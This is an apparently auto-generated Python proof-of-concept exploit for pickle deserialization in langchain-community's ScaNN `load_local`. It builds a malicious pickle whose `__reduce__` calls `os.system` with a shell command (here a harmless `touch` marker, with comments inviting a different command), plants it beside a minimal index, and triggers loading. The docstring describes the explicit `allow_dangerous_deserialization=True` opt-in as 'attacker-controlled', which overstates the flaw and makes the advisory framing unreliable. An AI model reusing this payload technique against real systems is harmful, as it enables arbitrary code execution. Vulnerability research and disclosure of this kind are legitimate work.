#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-015
# Sink: load_local
# Auto-generated — run with: python3 rce_load_local_function_scann_load_local.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for pickle deserialization RCE in langchain-community's
ScaNN vector store (load_local function).

The vulnerability exists because the `load_local` method accepts attacker-controlled
parameters `folder_path`, `index_name`, and `allow_dangerous_deserialization`.
When `allow_dangerous_deserialization` is set to True (which the attacker can do),
it opens and deserializes a pickle file using ``pickle.load`` without any
additional path validation. An attacker can craft a malicious pickle file that
executes arbitrary commands when loaded.

This PoC:
1. Generates a minimal ScaNN index (required by the function) and a malicious
   pickle payload.
2. Calls the vulnerable `load_local` function with crafted parameters.
3. The malicious pickle executes a benign command (``touch /tmp/poc_success.txt``)
   to prove code execution.

Requirements:
- Python 3.8+
- `scann` package installed (as a dependency of langchain-community)
- `langchain_community` accessible (installed or on PYTHONPATH)

Usage:
    python3 poc_scann_rce.py

After successful execution, check for the file /tmp/poc_success.txt.
"""

import os
import sys
import tempfile
import pickle
import subprocess
from pathlib import Path
from typing import Any

# ========== Configuration ==========
# If you want to attack a remote endpoint, set REMOTE_URL and modify the HTTP
# request part (not implemented here). This PoC demonstrates local exploitation.
REMOTE_URL = "http://localhost:8000/api/v1/trigger"  # placeholder
# ===================================

# Safe payload: creates a marker file to prove code execution.
# Change to `id` or similar for verification.
PAYLOAD_COMMAND = "touch /tmp/poc_success.txt"


def create_malicious_pickle(payload_command: str) -> bytes:
    """
    Build a pickle blob that, when unpickled, executes the given shell command.
    Uses the standard ``__reduce__`` technique.
    """
    class MaliciousPickle(object):
        def __reduce__(self) -> tuple:
            return (os.system, (payload_command,))

    return pickle.dumps(MaliciousPickle())


def create_minimal_scann_index(directory: Path) -> None:
    """
    Create a minimal ScaNN index in the given directory so that
    scann.scann_ops_pybind.load_searcher does not fail.
    The index is built from random data and then serialized.
    """
    try:
        import scann
    except ImportError:
        print("[!] scann is not installed; cannot create a valid index.")
        print("[!] The exploit will fail at the Searcher load step.")
        print("[!] Install scann or modify the PoC to mock the call.")
        sys.exit(1)

    import numpy as np  # numpy is a required dependency of scann

    # Create a tiny dataset: 50 points, 2 dimensions
    data = np.random.rand(50, 2).astype(np.float32)

    # Build a ScaNN searcher with default parameters
    searcher = scann.scann_ops.builder(data, 10, "dot_product").build()

    # Save the searcher to the directory (this creates the necessary files)
    searcher.serialize(str(directory))

    print(f"[*] Saved minimal ScaNN index to {directory}")


def main() -> None:
    print("[*] ScaNN Pickle Deserialization RCE PoC")
    print("[*] This script demonstrates local exploitation.")

    # Create a temporary directory for the fake index and pickle
    with tempfile.TemporaryDirectory() as tmp_dir:
        folder_path = Path(tmp_dir) / "scann_store"
        folder_path.mkdir(parents=True, exist_ok=True)

        index_name = "myindex"

        # Step 1: Create a minimal ScaNN index in the expected location
        scann_path = folder_path / f"{index_name}.scann"
        scann_path.mkdir(parents=True, exist_ok=True)
        print(f"[*] Creating ScaNN index in {scann_path} ...")
        create_minimal_scann_index(scann_path)

        # Step 2: Write the malicious pickle file
        malicious_pkl = create_malicious_pickle(PAYLOAD_COMMAND)
        pkl_path = folder_path / f"{index_name}.pkl"
        with open(pkl_path, "wb") as f:
            f.write(malicious_pkl)
        print(f"[*] Malicious pickle written to {pkl_path}")

        # Step 3: Call the vulnerable function
        # We need to import the langchain_community module.
        # Ensure the module is on sys.path or installed.
        sys.path.insert(0, "/tmp/langchain-community-only")  # adjust if needed
        try:
            from langchain_community.vectorstores.scann import ScaNN
        except ImportError:
            print("[!] Could not import ScaNN from langchain_community.")
            print("[!] Make sure langchain-community is installed or is on PYTHONPATH.")
            sys.exit(1)

        # The function expects an embedding object and additional kwargs,
        # but for the exploit we only need to trigger the deserialization.
        # We'll provide a dummy embedding (None will cause errors later, but
        # the pickle load happens before that).
        print("[*] Calling load_local with attacker-controlled parameters...")
        try:
            ScaNN.load_local(
                folder_path=str(folder_path),
                embedding=None,
                index_name=index_name,
                allow_dangerous_deserialization=True,
            )
        except Exception as e:
            # The exploit may still have worked even if the function raises
            # after the pickle load (e.g., because embedding is None).
            print(f"[*] Ignoring exception after pickle load (expected): {e}")

        # Step 4: Verify the payload execution
        marker_file = Path("/tmp/poc_success.txt")
        if marker_file.exists():
            print("[+] SUCCESS: Marker file /tmp/poc_success.txt was created.")
            print("[+] Arbitrary code execution achieved!")
            # Clean up the marker
            marker_file.unlink()
        else:
            print("[-] Marker file not found. Exploit may have failed.")
            print("[-] Check for errors above.")


if __name__ == "__main__":
    main()
